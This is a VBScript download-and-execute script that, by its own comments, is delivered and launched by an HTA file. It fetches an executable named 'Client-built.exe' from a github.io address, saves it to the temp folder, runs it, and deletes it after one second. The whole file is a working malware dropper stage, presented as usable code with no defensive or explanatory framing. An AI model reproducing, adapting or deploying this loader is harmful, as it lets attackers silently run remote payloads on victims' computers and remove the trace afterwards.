Option Explicit
' VBS Download and Execute Script
' This script will be downloaded and executed by the HTA file

' Initialize variables
Dim x, fso, temp, tempFile, stream, shell

On Error Resume Next

' Create HTTP object for downloading
Set x = CreateObject("MSXML2.XMLHTTP")

' Replace with your actual executable URL
x.Open "GET", "https://homleds.github.io/Client-built.exe/", False
x.Send

' Check if download was successful
If Err.Number <> 0 Then
    WScript.Echo "Error downloading file: " & Err.Description
    WScript.Quit 1
End If

' Set up file system objects
Set fso = CreateObject("Scripting.FileSystemObject")
Set temp = fso.GetSpecialFolder(2) ' Temporary folder
tempFile = temp & "\download.exe"

' Write the downloaded content to a file
Set stream = CreateObject("ADODB.Stream")
stream.Type = 1 ' Binary
stream.Open
stream.Write x.responseBody
If Err.Number <> 0 Then
    WScript.Echo "Error writing file: " & Err.Description
    WScript.Quit 1
End If

stream.SaveToFile tempFile, 2 ' Overwrite if exists
stream.Close

' Set up the shell object and execute the file
Set shell = CreateObject("WScript.Shell")
shell.Run tempFile, 1, False

' Clean up
WScript.Sleep 1000 ' Wait a bit before cleanup
fso.DeleteFile tempFile
Set stream = Nothing
Set fso = Nothing
Set shell = Nothing
Set x = Nothing
